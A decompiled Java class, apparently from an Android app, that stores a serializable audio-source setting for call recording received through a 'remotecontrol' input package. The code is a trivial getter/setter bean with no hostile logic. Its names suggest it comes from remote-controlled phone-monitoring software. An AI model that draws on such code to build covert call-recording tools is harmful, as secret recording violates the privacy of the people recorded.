package com.vvt.remotecontrol.input;

import java.io.Serializable;

public class RmtCtrlInputCallRecordingAudioSource
  implements Serializable
{
  private static final long serialVersionUID = -2989231263695334105L;
  private RmtCtrlInputCallRecordingAudioSource.AudioSource mSource;
  
  public RmtCtrlInputCallRecordingAudioSource.AudioSource getAudioSource()
  {
    return this.mSource;
  }
  
  public void setAudioSource(RmtCtrlInputCallRecordingAudioSource.AudioSource paramAudioSource)
  {
    this.mSource = paramAudioSource;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecontrol/input/RmtCtrlInputCallRecordingAudioSource.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */